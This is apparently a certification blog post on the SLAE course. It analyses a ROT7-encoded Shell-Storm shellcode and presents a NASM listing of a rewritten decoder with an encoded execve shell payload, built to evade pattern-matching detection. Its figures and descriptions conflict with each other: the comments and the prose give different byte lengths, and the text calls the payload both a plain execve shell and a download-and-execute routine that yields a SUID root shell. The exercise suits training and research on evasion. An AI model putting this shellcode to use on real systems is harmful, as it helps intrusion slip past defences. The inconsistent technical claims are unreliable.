# Assignment 6: ROT7 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## Solution

In this post we are going to look at the Download and Execute shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-900.php](http://shell-storm.org/shellcode/files/shellcode-900.php "").

### Shellcode Analysis

To begin, lets grab a copy of that shellcode, compile it, and trace it with GDB:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/gdb1.png "GDB")

As can be appreciated, the shellcode uses the `JMP-CALL-POP` technique to get the payload address on the stack. The payload in this case is is the following string:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/gdb2.png "Encoded Payload")

which is of course the ROT7 encoded version of the shellcode that we want to execute. 

To decode the encoded opcodes, the shellcode loops around `0x1e` (30) times, basically doing `f(x) = 0x100 + (0x7 - x)`, where `x` is the next opcode. The encoded opcode is replaced by the decoded one, which is the result of the aforementioned mathematical expression. When everything is decoded, the control is transfered to the shellcode address previously `JMP-CALL-POP`ed.

If we break after the shellcode has been decoded, we can see that the decoded version is what is commonly known as a "stack-based `execve()` shell" shellcode. 

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/gdb3.png "Decoded Payload")

### Polymorphic Shellcode

Like the original shellcode from Shell-Storm, the morphed version will use the `JMP-CALL-POP` technique to get the address of the encoded shellcode. However, the mathematical manipulation will be different: `f(x) = x - 0x7`, where `x` is the next opcode. The encoded opcode will be replaced by the decoded one, which would be the result of the aforementioned mathematical expression.

### a6-rot7-decode.nasm
```nasm
; SLAE Assignment 6: ROT7 decoder (morphed)
; http://shell-storm.org/shellcode/files/shellcode-900.php
; Original Shellcode Length: 74
; Morphed Shellcode Length:  54

global _start
section .text
_start:
	jmp short stage

decoder:
	pop esi						; shellcode address
	mov al, byte [esi]			; shellcode length
	xor ecx, ecx 				; position

decode:
	mov bl, byte [esi+ecx+1]	; get rot'ed byted
	sub bl, 0x7					; rot it back (-7)
	mov byte [esi+ecx], bl		; store it in shellcode
	inc ecx						; next position
	cmp al, cl					; check if reached the end of shellcode
	jnz short decode 			; 	if not, continue derot'ing
	jmp shellcode				;	else, execute derot'ed shellcode

stage:
	call decoder
	
	; Shellcode Format: 
	; 	byte[0] 	= length of shellcode (max 0xff)
	;	byte[1..] 	= rot'ed shellcode
	shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
```

Let us go ahead and check if everything works as it should.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/example.png "Example")

It looks like everything works as expected. The file is correctly downloaded, chmod'ed and executed, giving us a SUID root shell.

Now let's go on to check how the morphed version compares to the original shellcode.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/length.png "Shellcode length")

Our morphed version is 96 bytes in length, which is of course 12 bytes shorter than the original 108 bytes. 




